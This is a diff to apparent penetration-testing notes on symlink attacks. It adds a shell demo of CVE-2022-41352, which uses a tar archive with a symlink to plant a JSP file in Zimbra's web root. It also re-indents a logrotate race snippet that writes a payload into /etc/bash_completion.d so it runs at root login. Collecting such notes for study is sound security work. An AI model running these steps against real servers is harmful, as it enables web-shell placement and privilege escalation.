@@ -139,18 +139,29 @@ done
 
 ### symlink
 
+- [CVE\-2022\-41352 \| AttackerKB](https://attackerkb.com/topics/1DDTvUNFzH/cve-2022-41352/rapid7-analysis)
+    ```sh
+    sudo mkdir -p /opt/zimbra/jetty_base/webapps/zimbra/public
+    sudo chown ron.ron /opt/zimbra/jetty_base/webapps/zimbra/public
+    ln -s /opt/zimbra/jetty_base/webapps/zimbra/public ./akbdemo
+    echo '<% out.println("Hello world!"); %>' > akbdemo/akbtest.jsp
+    tar -cf akbdemo.tar akbdemo akbdemo/akbtest.jsp
+    tar -tvf akbdemo.tar
+    # lrwxrwxrwx ron/ron           0 2022-10-06 09:25 akbdemo -> /opt/zimbra/jetty_base/webapps/zimbra/public
+    # -rw-r--r-- ron/ron          35 2022-10-06 09:26 akbdemo/akbtest.jsp
+    ```
 - [Book \- HackThebox | Samir Ettali](https://samirettali.com/writeups/hackthebox/book/)
     - https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition
-        ```bash
-        # logrotate: stat /tmp/logs/file.log
-        # attacker:
-        mv /tmp/logs /tmp/logs2
-        ln -s /etc/bash_completion.d /tmp/logs
-        # logrotate: create+chown /tmp/logs/file.log
-        # attacker:
-        echo 'payload' > /tmp/logs/file.log
-        # On root login, payload executed
-        ```
+    ```bash
+    # logrotate: stat /tmp/logs/file.log
+    # attacker:
+    mv /tmp/logs /tmp/logs2
+    ln -s /etc/bash_completion.d /tmp/logs
+    # logrotate: create+chown /tmp/logs/file.log
+    # attacker:
+    echo 'payload' > /tmp/logs/file.log
+    # On root login, payload executed
+    ```
 
 # priviledge escalation
 
